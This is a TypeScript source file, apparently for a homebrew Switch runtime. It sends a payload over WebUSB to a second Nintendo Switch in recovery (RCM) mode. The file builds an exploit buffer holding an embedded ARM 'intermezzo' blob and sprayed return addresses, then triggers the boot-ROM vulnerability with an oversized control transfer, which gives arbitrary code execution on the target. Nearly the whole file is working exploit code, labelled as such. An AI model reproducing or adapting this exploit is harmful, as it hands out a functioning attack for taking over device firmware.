const intermezzo = new Uint8Array([
	0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5,
	0x00, 0x20, 0x42, 0xe0, 0x08, 0x00, 0x00, 0xeb, 0x01, 0x01, 0xa0, 0xe3,
	0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1, 0x2c, 0x00, 0x9f, 0xe5,
	0x2c, 0x10, 0x9f, 0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb,
	0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04, 0x30, 0x90, 0xe4,
	0x04, 0x30, 0x81, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a,
	0x1e, 0xff, 0x2f, 0xe1, 0x20, 0xf0, 0x01, 0x40, 0x5c, 0xf0, 0x01, 0x40,
	0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
]);

const RCM_PAYLOAD_ADDRESS = 0x40010000;
const INTERMEZZO_LOCATION = 0x4001f000;
const PACKET_SIZE = 0x1000;

function createRCMPayload(payload: Uint8Array) {
	const rcmLength = 0x30298;
	const repeatCount = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;
	const size = Math.ceil(
		(0x2a8 + repeatCount * 4 + PACKET_SIZE + payload.byteLength) / PACKET_SIZE,
	) * PACKET_SIZE;
	const rcm = new Uint8Array(size);
	const view = new DataView(rcm.buffer);
	view.setUint32(0, rcmLength, true);
	for (let i = 0; i < repeatCount; i++) {
		view.setUint32(0x2a8 + i * 4, INTERMEZZO_LOCATION, true);
	}
	rcm.set(intermezzo, 0x2a8 + repeatCount * 4);
	rcm.set(payload, 0x2a8 + repeatCount * 4 + PACKET_SIZE);
	return rcm;
}

async function writePayload(device: USBDevice, data: Uint8Array) {
	let offset = 0;
	let writes = 0;
	while (offset < data.byteLength) {
		const end = Math.min(offset + PACKET_SIZE, data.byteLength);
		await device.transferOut(1, data.subarray(offset, end));
		offset = end;
		writes++;
	}
	return writes;
}

async function main() {
	console.log('WebUSB RCM payload sender');
	console.log('Place hekate/fusee at romfs:/payload.bin before building.');

	const payloadBuffer = Switch.readFileSync('romfs:/payload.bin');
	if (!payloadBuffer) {
		throw new Error('Missing romfs:/payload.bin');
	}
	const payload = new Uint8Array(payloadBuffer);
	console.log(`Payload: ${payload.byteLength} bytes`);
	console.log('Connect the target Switch in RCM mode over USB-C...');

	const device = await navigator.usb.requestDevice({
		filters: [{ vendorId: 0x0955, productId: 0x7321 }],
	});
	console.log(`Found USB device ${device.vendorId.toString(16)}:${device.productId.toString(16)}`);

	await device.open();
	await device.claimInterface(0);

	const deviceId = await device.transferIn(1, 16);
	console.log(
		`Device ID: ${[...new Uint8Array(deviceId.data!.buffer)]
			.map((v) => v.toString(16).padStart(2, '0'))
			.join('')}`,
	);

	console.log('Sending RCM payload...');
	const writes = await writePayload(device, createRCMPayload(payload));
	if (writes % 2 !== 1) {
		console.log('Sending padding packet...');
		await device.transferOut(1, new ArrayBuffer(PACKET_SIZE));
	}

	console.log('Triggering RCM vulnerability...');
	try {
		await device.controlTransferIn(
			{
				requestType: 'standard',
				recipient: 'interface',
				request: 0,
				value: 0,
				index: 0,
			},
			0x7000,
		);
	} catch (err) {
		console.log('Target disconnected during smash; this is expected if Hekate booted.');
	}
	console.log('Done.');
}

main().catch((err) => {
	console.error(err?.stack || err);
});
